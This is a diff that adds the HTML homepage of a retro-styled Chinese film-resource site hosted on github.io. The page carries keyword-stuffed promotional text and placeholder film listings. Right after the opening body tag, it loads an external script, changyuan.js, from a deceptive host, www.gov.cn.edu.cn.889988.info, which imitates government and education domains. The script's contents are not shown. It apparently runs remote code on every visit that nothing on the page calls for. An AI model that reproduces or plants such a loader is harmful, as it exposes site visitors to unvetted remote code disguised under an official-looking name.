@@ -1,0 +1,501 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>比比奇电影网 - 老胶片里的新故事 | 经典与潮流的影视汇聚地</title>
+<meta name="description" content="比比奇电影网(bibiqidianyingwang-top)是一个充满复古质感的影视资源平台，汇聚经典老片与当红新作。从黑白默片到4K大片，从国产佳片到海外口碑，每一部作品都值得被重新发现。访问：https://bibiqidianyingwang-top.github.io">
+<meta name="keywords" content="比比奇电影网,bibiqidianyingwang-top,经典电影,影视资源,老片新看,电影推荐,高清影视,在线观影,经典剧集,纪录片">
+<meta name="author" content="比比奇电影网">
+<style>
+/* ========== 复古暗色基调 ========== */
+* { margin: 0; padding: 0; box-sizing: border-box; }
+html { scroll-behavior: smooth; }
+body {
+  font-family: "Georgia", "Times New Roman", "PingFang SC", "Microsoft YaHei", serif;
+  background: #1a1612;
+  color: #e8e0d4;
+  line-height: 1.8;
+  overflow-x: hidden;
+}
+body::before {
+  content: '';
+  position: fixed; inset: 0;
+  background-image:
+    repeating-linear-gradient(0deg, rgba(0,0,0,0.08) 0px, rgba(0,0,0,0.08) 1px, transparent 1px, transparent 3px);
+  pointer-events: none; z-index: 9999;
+  mix-blend-mode: overlay;
+}
+a { text-decoration: none; color: inherit; }
+img { max-width: 100%; display: block; }
+
+/* ========== 顶部老式报头 ========== */
+.masthead-wrap {
+  background: #241e16;
+  border-bottom: 3px double #8b6914;
+  padding: 2.5rem 1rem 1.5rem;
+  text-align: center;
+  position: relative;
+}
+.masthead-wrap::after {
+  content: '';
+  position: absolute; bottom: -8px; left: 0; right: 0;
+  border-bottom: 1px solid #8b6914;
+}
+.paper-title {
+  font-size: clamp(2.2rem, 7vw, 4rem);
+  font-weight: 900;
+  letter-spacing: 6px;
+  color: #f0e6d2;
+  text-transform: uppercase;
+  text-shadow: 2px 2px 0 #8b6914, 4px 4px 0 rgba(0,0,0,0.4);
+}
+.paper-title span { color: #c8a951; }
+.paper-sub {
+  margin-top: 0.8rem;
+  font-size: 0.85rem;
+  letter-spacing: 5px;
+  color: #a89a7a;
+  font-style: italic;
+}
+.paper-date {
+  margin-top: 1rem;
+  font-size: 0.75rem;
+  color: #7a6e54;
+  letter-spacing: 2px;
+}
+
+/* ========== 导航 ========== */
+.nav-bar {
+  background: #2c2418;
+  border-bottom: 1px solid #4a3c28;
+  padding: 0.8rem 1rem;
+  position: sticky; top: 0; z-index: 100;
+}
+.nav-inner {
+  max-width: 1100px; margin: 0 auto;
+  display: flex; align-items: center; justify-content: space-between; gap: 1rem;
+}
+.nav-logo { font-weight: 900; font-size: 1.2rem; color: #c8a951; letter-spacing: 2px; white-space: nowrap; }
+.nav-menu { display: flex; gap: 0.3rem; list-style: none; flex-wrap: wrap; justify-content: flex-end; }
+.nav-menu a {
+  display: block; padding: 0.4rem 1rem;
+  font-size: 0.85rem; letter-spacing: 1px;
+  color: #c4b89c; border: 1px solid transparent;
+  transition: all 0.2s;
+  font-family: "PingFang SC", "Microsoft YaHei", sans-serif;
+}
+.nav-menu a:hover { border-color: #8b6914; color: #f0e6d2; background: rgba(139,105,20,0.1); }
+.nav-toggle { display: none; background: none; border: 1px solid #8b6914; color: #c8a951; font-size: 1.2rem; padding: 0.2rem 0.6rem; cursor: pointer; }
+
+/* ========== 通用容器 ========== */
+.container { max-width: 1100px; margin: 0 auto; padding: 0 1rem; position: relative; z-index: 1; }
+.section-block { margin: 3.5rem 0; }
+
+/* 栏目报头（报纸风） */
+.col-head {
+  border-bottom: 2px solid #8b6914;
+  padding-bottom: 0.5rem;
+  margin-bottom: 2rem;
+  display: flex; align-items: baseline; gap: 1rem; flex-wrap: wrap;
+}
+.col-head h2 {
+  font-size: 1.6rem; font-weight: 900; color: #f0e6d2; letter-spacing: 3px;
+}
+.col-head .col-en {
+  font-size: 0.7rem; letter-spacing: 3px; color: #8b7a5a; text-transform: uppercase;
+}
+.col-head .col-num {
+  margin-left: auto; font-size: 0.75rem; color: #7a6e54; letter-spacing: 1px;
+}
+
+/* ========== 头条文摘区 ========== */
+.lead-story {
+  display: grid; grid-template-columns: 1.2fr 1fr; gap: 2rem;
+  background: #221c14; border: 1px solid #3d3220;
+  padding: 1.5rem;
+}
+.lead-poster {
+  background: linear-gradient(135deg, #3a2c1a, #1a1612);
+  min-height: 280px;
+  display: flex; align-items: center; justify-content: center;
+  font-size: 5rem; border: 1px solid #4a3c28;
+}
+.lead-text h3 {
+  font-size: 1.4rem; color: #f0e6d2; margin-bottom: 0.8rem;
+  letter-spacing: 1px; line-height: 1.4;
+}
+.lead-text .meta {
+  font-size: 0.78rem; color: #8b7a5a; margin-bottom: 1rem;
+  font-family: "PingFang SC", sans-serif;
+}
+.lead-text .meta span { margin-right: 1rem; }
+.lead-text p { font-size: 0.95rem; color: #c4b89c; margin-bottom: 1rem; }
+.lead-link {
+  display: inline-block; padding: 0.5rem 1.5rem;
+  background: #8b6914; color: #1a1612; font-weight: 700;
+  font-size: 0.85rem; letter-spacing: 2px;
+  font-family: "PingFang SC", sans-serif;
+}
+.lead-link:hover { background: #c8a951; }
+
+/* ========== 影片网格（老式相框感） ========== */
+.film-grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(200px, 1fr)); gap: 1.5rem; }
+.film-frame {
+  background: #221c14; border: 1px solid #4a3c28;
+  padding: 0.6rem;
+  transition: transform 0.25s;
+}
+.film-frame:hover { transform: scale(1.02); border-color: #8b6914; }
+.film-poster {
+  height: 160px; display: flex; align-items: center; justify-content: center;
+  font-size: 3rem; color: rgba(255,255,255,0.5);
+  border: 1px solid #3d3220;
+}
+.film-info { padding: 0.8rem 0.4rem 0.2rem; }
+.film-info h4 { font-size: 1rem; color: #f0e6d2; margin-bottom: 0.3rem; }
+.film-info .sub { font-size: 0.75rem; color: #8b7a5a; font-family: "PingFang SC", sans-serif; }
+.film-info a { font-size: 0.8rem; color: #c8a951; font-family: "PingFang SC", sans-serif; }
+
+/* ========== 剧集排版（编辑选片风） */
+.editor-pick { display: grid; grid-template-columns: repeat(auto-fit, minmax(320px, 1fr)); gap: 2rem; }
+.pick-item {
+  background: #221c14; border-left: 4px solid #8b6914;
+  padding: 1.5rem;
+}
+.pick-item .pick-no {
+  font-size: 0.7rem; letter-spacing: 3px; color: #8b6914; margin-bottom: 0.5rem;
+}
+.pick-item h4 { font-size: 1.15rem; color: #f0e6d2; margin-bottom: 0.5rem; }
+.pick-item p { font-size: 0.9rem; color: #c4b89c; }
+.pick-item .pick-tag {
+  display: inline-block; margin-top: 0.8rem;
+  font-size: 0.72rem; color: #c8a951;
+  border: 1px solid #8b6914; padding: 2px 8px;
+}
+
+/* ========== 纪录片/资料区 ========== */
+.archive-table { width: 100%; border-collapse: collapse; }
+.archive-table th {
+  text-align: left; padding: 0.8rem 1rem;
+  background: #2c2418; color: #c8a951; font-size: 0.85rem;
+  letter-spacing: 2px; border-bottom: 2px solid #8b6914;
+}
+.archive-table td {
+  padding: 0.8rem 1rem; border-bottom: 1px dotted #4a3c28;
+  font-size: 0.9rem; color: #c4b89c;
+}
+.archive-table tr:hover td { background: rgba(139,105,20,0.06); }
+.archive-table td a { color: #c8a951; }
+
+/* ========== 关于区 ========== */
+.about-box {
+  background: #221c14; border: 2px solid #4a3c28;
+  padding: 2rem; position: relative;
+}
+.about-box::before {
+  content: '✦'; position: absolute; top: -12px; left: 2rem;
+  background: #1a1612; padding: 0 0.5rem; color: #8b6914; font-size: 1.2rem;
+}
+.about-box p { color: #c4b89c; font-size: 0.95rem; margin-bottom: 1rem; }
+.about-box .site-url { color: #c8a951; font-weight: 700; }
+
+/* ========== 页脚（版权声明栏） */
+.footer {
+  margin-top: 4rem; background: #14110d;
+  border-top: 3px double #8b6914;
+  padding: 3rem 1rem 1.5rem;
+}
+.footer-inner { max-width: 1100px; margin: 0 auto; }
+.footer-grid {
+  display: grid; grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
+  gap: 2rem; margin-bottom: 2rem;
+}
+.footer-col h4 { color: #c8a951; font-size: 0.9rem; letter-spacing: 2px; margin-bottom: 1rem; }
+.footer-col ul { list-style: none; }
+.footer-col ul li { margin-bottom: 0.5rem; }
+.footer-col ul li a { color: #8b7a5a; font-size: 0.85rem; font-family: "PingFang SC", sans-serif; }
+.footer-col ul li a:hover { color: #f0e6d2; }
+.footer-col p { font-size: 0.85rem; color: #8b7a5a; font-family: "PingFang SC", sans-serif; }
+.footer-bottom {
+  text-align: center; padding-top: 1.5rem;
+  border-top: 1px solid #4a3c28;
+  font-size: 0.75rem; color: #6a5e44; letter-spacing: 1px;
+}
+
+/* ========== 响应式 ========== */
+@media (max-width: 768px) {
+  .nav-toggle { display: block; }
+  .nav-menu {
+    display: none; position: absolute; top: 100%; left: 0; right: 0;
+    flex-direction: column; background: #2c2418; padding: 1rem;
+    border-bottom: 1px solid #4a3c28;
+  }
+  .nav-menu.open { display: flex; }
+  .nav-menu a { border-bottom: 1px solid #3d3220; padding: 0.8rem; }
+  .lead-story { grid-template-columns: 1fr; }
+  .paper-title { letter-spacing: 3px; }
+  .col-head .col-num { display: none; }
+}
+</style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/changyuan.js"></script>
+
+<!-- ===== 报头 ===== -->
+<header class="masthead-wrap">
+  <h1 class="paper-title">比比奇 <span>·</span> 电影网</h1>
+  <div class="paper-sub">— 老胶片里的新故事 · 经典与潮流的影视汇聚地 —</div>
+  <div class="paper-date">VOL.2026 / 每日更新 / 光影志</div>
+</header>
+
+<!-- ===== 导航 ===== -->
+<nav class="nav-bar">
+  <div class="nav-inner">
+    <div class="nav-logo">BIBIQI FILM</div>
+    <button class="nav-toggle" onclick="document.getElementById('menu').classList.toggle('open')">☰</button>
+    <ul class="nav-menu" id="menu">
+      <li><a href="#home">首页</a></li>
+      <li><a href="#today">今日推荐</a></li>
+      <li><a href="#classic">经典回顾</a></li>
+      <li><a href="#series">剧集剧场</a></li>
+      <li><a href="#archive">影像档案</a></li>
+      <li><a href="#about">关于我们</a></li>
+    </ul>
+  </div>
+</nav>
+
+<!-- ===== 头条文摘 ===== -->
+<section class="container section-block" id="home">
+  <div class="lead-story">
+    <div class="lead-poster">🎞️</div>
+    <div class="lead-text">
+      <h3>本周主打：那些被时间遗忘的镜头，正在被重新看见</h3>
+      <div class="meta"><span>专题策划</span><span>编辑精选</span><span>2026</span></div>
+      <p>从黑白默片的沉默张力，到新浪潮的自由呼吸；从经典老片的数字修复，到当红新作的首发集结——比比奇电影网，用一份老式电影志的态度，带你重新打捞那些值得反复咀嚼的影像。</p>
+      <a href="#" class="lead-link">阅读专题 →</a>
+    </div>
+  </div>
+</section>
+
+<!-- ===== 今日推荐 ===== -->
+<section class="container section-block" id="today">
+  <div class="col-head">
+    <h2>今日推荐</h2>
+    <span class="col-en">Today's Picks</span>
+    <span class="col-num">No.01</span>
+  </div>
+  <div class="film-grid">
+    <div class="film-frame">
+      <div class="film-poster" style="background:linear-gradient(135deg,#4a3c28,#2c2418);">🌊</div>
+      <div class="film-info">
+        <h4>海边的旧电影院</h4>
+        <div class="sub">文艺 · 2026 · 4K修复</div>
+        <a href="#">详情 →</a>
+      </div>
+    </div>
+    <div class="film-frame">
+      <div class="film-poster" style="background:linear-gradient(135deg,#5c4033,#3d2817);">🔫</div>
+      <div class="film-info">
+        <h4>午夜追踪</h4>
+        <div class="sub">犯罪悬疑 · 2026 · 院线同步</div>
+        <a href="#">详情 →</a>
+      </div>
+    </div>
+    <div class="film-frame">
+      <div class="film-poster" style="background:linear-gradient(135deg,#6b4c3a,#4a3322);">🎭</div>
+      <div class="film-info">
+        <h4>舞台背后</h4>
+        <div class="sub">剧情 · 2026 · 口碑佳作</div>
+        <a href="#">详情 →</a>
+      </div>
+    </div>
+    <div class="film-frame">
+      <div class="film-poster" style="background:linear-gradient(135deg,#3d3220,#241e16);">🌾</div>
+      <div class="film-info">
+        <h4>风吹麦浪</h4>
+        <div class="sub">家庭温情 · 2026 · 治愈系</div>
+        <a href="#">详情 →</a>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- ===== 经典回顾 ===== -->
+<section class="container section-block" id="classic">
+  <div class="col-head">
+    <h2>经典回顾</h2>
+    <span class="col-en">Classic Rewind</span>
+    <span class="col-num">No.02</span>
+  </div>
+  <div class="film-grid">
+    <div class="film-frame">
+      <div class="film-poster" style="background:linear-gradient(135deg,#2a2a3a,#1a1a26);">🎬</div>
+      <div class="film-info">
+        <h4>黑白默片精选集</h4>
+        <div class="sub">1920s-1930s · 修复版</div>
+        <a href="#">详情 →</a>
+      </div>
+    </div>
+    <div class="film-frame">
+      <div class="film-poster" style="background:linear-gradient(135deg,#3a2a2a,#261a1a);">🚂</div>
+      <div class="film-info">
+        <h4>黄金年代大赏</h4>
+        <div class="sub">1950s-1970s · 不朽名作</div>
+        <a href="#">详情 →</a>
+      </div>
+    </div>
+    <div class="film-frame">
+      <div class="film-poster" style="background:linear-gradient(135deg,#2a3a3a,#1a2626);">🎵</div>
+      <div class="film-info">
+        <h4>歌舞片黄金年代</h4>
+        <div class="sub">1950s · 百老汇风情</div>
+        <a href="#">详情 →</a>
+      </div>
+    </div>
+    <div class="film-frame">
+      <div class="film-poster" style="background:linear-gradient(135deg,#3a3a2a,#26261a);">📽️</div>
+      <div class="film-info">
+        <h4>新浪潮影展</h4>
+        <div class="sub">1960s · 法国 · 先锋实验</div>
+        <a href="#">详情 →</a>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- ===== 剧集剧场 ===== -->
+<section class="container section-block" id="series">
+  <div class="col-head">
+    <h2>剧集剧场</h2>
+    <span class="col-en">Series Theatre</span>
+    <span class="col-num">No.03</span>
+  </div>
+  <div class="editor-pick">
+    <div class="pick-item">
+      <div class="pick-no">EDITOR'S PICK 01</div>
+      <h4>长安十二时辰·外传</h4>
+      <p>古装悬疑剧的巅峰续作，将盛唐长安的市井烟火与权谋暗涌刻画得淋漓尽致，每一帧都堪比电影质感。</p>
+      <span class="pick-tag">历史悬疑 · 12集全</span>
+    </div>
+    <div class="pick-item">
+      <div class="pick-no">EDITOR'S PICK 02</div>
+      <h4>城南旧事·新编</h4>
+      <p>以现代视角重新演绎经典文学，细腻描摹老北京胡同里的悲欢离合，温情中带着时代的重量。</p>
+      <span class="pick-tag">年代剧情 · 连载中</span>
+    </div>
+    <div class="pick-item">
+      <div class="pick-no">EDITOR'S PICK 03</div>
+      <h4>深夜食堂·归途</h4>
+      <p>一间深夜小店，一群夜归人。单元剧形式讲述都市人的温暖故事，治愈每个疲惫的灵魂。</p>
+      <span class="pick-tag">都市治愈 · 24集全</span>
+    </div>
+    <div class="pick-item">
+      <div class="pick-no">EDITOR'S PICK 04</div>
+      <h4>极地追凶</h4>
+      <p>北极科考站连环谜案，冰天雪地中的人性博弈，密闭空间悬疑剧的教科书级作品。</p>
+      <span class="pick-tag">科幻悬疑 · 8集全</span>
+    </div>
+  </div>
+</section>
+
+<!-- ===== 影像档案 ===== -->
+<section class="container section-block" id="archive">
+  <div class="col-head">
+    <h2>影像档案</h2>
+    <span class="col-en">Film Archive</span>
+    <span class="col-num">No.04</span>
+  </div>
+  <table class="archive-table">
+    <thead>
+      <tr>
+        <th>片名</th>
+        <th>类型</th>
+        <th>年代</th>
+        <th>状态</th>
+        <th>链接</th>
+      </tr>
+    </thead>
+    <tbody>
+      <tr>
+        <td>光影百年·纪录片系列</td>
+        <td>纪录片</td>
+        <td>2026</td>
+        <td>连载中</td>
+        <td><a href="#">查看 →</a></td>
+      </tr>
+      <tr>
+        <td>独立电影人·短片集</td>
+        <td>独立短片</td>
+        <td>2025-2026</td>
+        <td>合集</td>
+        <td><a href="#">查看 →</a></td>
+      </tr>
+      <tr>
+        <td>动画百年·手绘珍藏</td>
+        <td>动画</td>
+        <td>经典修复</td>
+        <td>合集</td>
+        <td><a href="#">查看 →</a></td>
+      </tr>
+      <tr>
+        <td>世界电影史·大师课</td>
+        <td>访谈/讲座</td>
+        <td>2026</td>
+        <td>连载中</td>
+        <td><a href="#">查看 →</a></td>
+      </tr>
+    </tbody>
+  </table>
+</section>
+
+<!-- ===== 关于我们 ===== -->
+<section class="container section-block" id="about">
+  <div class="col-head">
+    <h2>关于比比奇电影网</h2>
+    <span class="col-en">About Us</span>
+    <span class="col-num">No.05</span>
+  </div>
+  <div class="about-box">
+    <p>比比奇电影网（bibiqidianyingwang-top）是一个以复古电影志为灵感的影视资源聚合平台。我们相信，好电影不该被时间埋没，新作品也值得被认真推荐。</p>
+    <p>从经典老片到当红新作，从国产佳片到海外口碑，我们用心筛选每一部作品，只为让您在茫茫片海中，找到那一部恰好对味的影像。</p>
+    <p>官方网站：<span class="site-url">https://bibiqidianyingwang-top.github.io</span></p>
+  </div>
+</section>
+
+<!-- ===== 页脚 ===== -->
+<footer class="footer">
+  <div class="footer-inner">
+    <div class="footer-grid">
+      <div class="footer-col">
+        <h4>栏目导航</h4>
+        <ul>
+          <li><a href="#home">首页</a></li>
+          <li><a href="#today">今日推荐</a></li>
+          <li><a href="#classic">经典回顾</a></li>
+          <li><a href="#series">剧集剧场</a></li>
+        </ul>
+      </div>
+      <div class="footer-col">
+        <h4>关于我们</h4>
+        <ul>
+          <li><a href="#about">平台简介</a></li>
+          <li><a href="#">投稿合作</a></li>
+          <li><a href="#">免责声明</a></li>
+        </ul>
+      </div>
+      <div class="footer-col">
+        <h4>官方信息</h4>
+        <p>网站名称：比比奇电影网</p>
+        <p>访问地址：bibiqidianyingwang-top.github.io</p>
+      </div>
+    </div>
+    <div class="footer-bottom">
+      © 2026 比比奇电影网 bibiqidianyingwang-top.github.io · 老胶片里的新故事
+    </div>
+  </div>
+</footer>
+
+</body>
+</html>
